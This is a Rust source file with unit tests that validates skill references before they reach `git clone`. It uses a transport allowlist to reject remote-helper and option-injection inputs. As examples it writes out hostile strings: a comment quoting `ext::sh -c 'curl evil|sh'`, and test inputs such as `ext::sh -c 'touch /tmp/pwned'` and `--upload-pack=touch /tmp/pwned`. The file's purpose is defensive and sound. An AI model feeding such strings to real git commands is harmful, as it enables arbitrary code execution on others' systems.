//! Turning a user-supplied skill reference into a git URL we are willing to clone.
//!
//! The interesting half is what gets *rejected*. Git's remote-helper syntax
//! (`<helper>::<address>`) makes a URL an executable: `ext::sh -c 'curl evil|sh'`
//! runs that command, and `fd::` hands git a caller-controlled file descriptor.
//! Neither is a transport, both are code execution, and both look like ordinary
//! strings to anything that only pattern-matches on `github.com`. So the check is
//! an allowlist of transports, applied before the string ever reaches `git`.
//!
//! Ported from `acquire/fetch.ts` in inkeep/open-knowledge (commit
//! `53dbab202cb7`), whose `ALLOWED_GIT_TRANSPORTS` this mirrors.

/// Transports safe to hand to `git clone`. Anything else — notably `ext::` and
/// `fd::` — is rejected before the clone.
const ALLOWED_GIT_TRANSPORTS: [&str; 5] = ["https", "http", "ssh", "git", "file"];

/// A parsed, transport-checked skill reference.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct SkillSource {
    /// The reference exactly as the user gave it. Recorded in the cache index
    /// so a later lookup can be keyed on what was asked for, not on what it
    /// was normalised to.
    pub raw: String,
    /// The URL to clone.
    pub url: String,
    /// Branch, tag or commit sha to fetch. `None` means the remote's default
    /// branch.
    pub git_ref: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum SourceError {
    /// Empty, or otherwise not a reference at all.
    Malformed(String),
    /// A syntactically fine reference on a transport we will not run.
    ForbiddenTransport(String),
}

impl std::fmt::Display for SourceError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Malformed(source) => write!(f, "not a usable skill source: {source}"),
            Self::ForbiddenTransport(source) => {
                write!(
                    f,
                    "refusing to clone over an unsupported transport: {source}"
                )
            }
        }
    }
}

/// Parse `raw` — `owner/repo`, `github.com/owner/repo`, a full git URL, or any
/// of those with a `#ref` suffix — into something clonable.
pub(crate) fn parse_skill_source(raw: &str) -> Result<SkillSource, SourceError> {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return Err(SourceError::Malformed(raw.to_string()));
    }
    // A leading dash would be read by git as an option, not a URL.
    if trimmed.starts_with('-') {
        return Err(SourceError::Malformed(raw.to_string()));
    }

    let (locator, git_ref) = match trimmed.split_once('#') {
        Some((locator, git_ref)) if !git_ref.is_empty() => (locator, Some(git_ref.to_string())),
        Some((locator, _)) => (locator, None),
        None => (trimmed, None),
    };

    let url = normalize_locator(locator).ok_or_else(|| classify_rejection(locator, raw))?;

    Ok(SkillSource {
        raw: trimmed.to_string(),
        url,
        git_ref,
    })
}

/// `None` for anything we will not clone; the caller decides how to label it.
fn normalize_locator(locator: &str) -> Option<String> {
    if locator.is_empty() {
        return None;
    }

    if let Some((scheme, rest)) = locator.split_once("://") {
        if !ALLOWED_GIT_TRANSPORTS.contains(&scheme) || rest.is_empty() {
            return None;
        }
        return Some(locator.to_string());
    }

    // Remote-helper syntax (`ext::`, `fd::`, and every third-party helper) has
    // no `://`, so it has to be caught here rather than by the scheme check.
    if locator.contains("::") {
        return None;
    }

    // scp-style ssh, e.g. `git@github.com:owner/repo.git`. `user@host:path`
    // only — an absolute Windows path (`C:\...`) has no `@` and falls through.
    if let Some((user_host, path)) = locator.split_once(':') {
        if user_host.contains('@') && !path.is_empty() {
            return Some(locator.to_string());
        }
        return None;
    }

    // An absolute path is a local repository, which is `file` by another name.
    if locator.starts_with('/') {
        return Some(locator.to_string());
    }

    let shorthand = locator.strip_prefix("github.com/").unwrap_or(locator);
    let segments: Vec<&str> = shorthand.split('/').filter(|s| !s.is_empty()).collect();
    // `owner/repo` and nothing longer: a deeper path is a link to a file inside
    // the repo, and this seam has no opinion about paths inside a bundle.
    if segments.len() != 2 || segments.iter().any(|s| s.starts_with('-')) {
        return None;
    }
    Some(format!(
        "https://github.com/{}/{}.git",
        segments[0],
        segments[1].strip_suffix(".git").unwrap_or(segments[1])
    ))
}

/// A rejection is a transport problem when the reference names a transport we
/// disallow; a reference on an allowed transport that still failed to parse is
/// merely malformed.
fn classify_rejection(locator: &str, raw: &str) -> SourceError {
    let forbidden_transport = match locator.split_once("://") {
        Some((scheme, _)) => !ALLOWED_GIT_TRANSPORTS.contains(&scheme),
        None => locator.contains("::"),
    };
    if forbidden_transport {
        SourceError::ForbiddenTransport(raw.to_string())
    } else {
        SourceError::Malformed(raw.to_string())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn parsed(raw: &str) -> SkillSource {
        parse_skill_source(raw).unwrap()
    }

    #[test]
    fn github_shorthand_becomes_an_https_url() {
        assert_eq!(
            parsed("vercel-labs/agent-skills").url,
            "https://github.com/vercel-labs/agent-skills.git"
        );
        assert_eq!(
            parsed("github.com/vercel-labs/agent-skills").url,
            "https://github.com/vercel-labs/agent-skills.git"
        );
        assert_eq!(
            parsed("vercel-labs/agent-skills.git").url,
            "https://github.com/vercel-labs/agent-skills.git"
        );
    }

    #[test]
    fn raw_reference_is_kept_verbatim() {
        let source = parsed("  vercel-labs/agent-skills#v2  ");
        assert_eq!(source.raw, "vercel-labs/agent-skills#v2");
        assert_eq!(source.git_ref.as_deref(), Some("v2"));
    }

    #[test]
    fn allowed_transports_pass_through_unchanged() {
        for url in [
            "https://example.com/owner/repo.git",
            "http://example.com/owner/repo.git",
            "ssh://git@example.com/owner/repo.git",
            "git://example.com/owner/repo.git",
            "file:///tmp/repo.git",
            "git@github.com:owner/repo.git",
            "/tmp/repo.git",
        ] {
            assert_eq!(parsed(url).url, url, "{url}");
        }
    }

    #[test]
    fn command_executing_transports_are_rejected() {
        for url in [
            "ext::sh -c 'touch /tmp/pwned'",
            "fd::7/8",
            "ext::git-upload-pack",
            "helper::anything",
        ] {
            assert_eq!(
                parse_skill_source(url),
                Err(SourceError::ForbiddenTransport(url.to_string())),
                "{url}"
            );
        }
    }

    #[test]
    fn unknown_schemes_are_rejected() {
        for url in ["ftp://example.com/repo.git", "javascript://x"] {
            assert_eq!(
                parse_skill_source(url),
                Err(SourceError::ForbiddenTransport(url.to_string())),
                "{url}"
            );
        }
    }

    #[test]
    fn option_shaped_and_empty_references_are_rejected() {
        for raw in [
            "",
            "   ",
            "--upload-pack=touch /tmp/pwned",
            "-oProxyCommand=x",
            "owner/-repo",
            "just-one-segment",
            "owner/repo/skills/nested",
            "https://",
        ] {
            assert!(
                matches!(parse_skill_source(raw), Err(SourceError::Malformed(_))),
                "{raw} should be malformed, got {:?}",
                parse_skill_source(raw)
            );
        }
    }
}
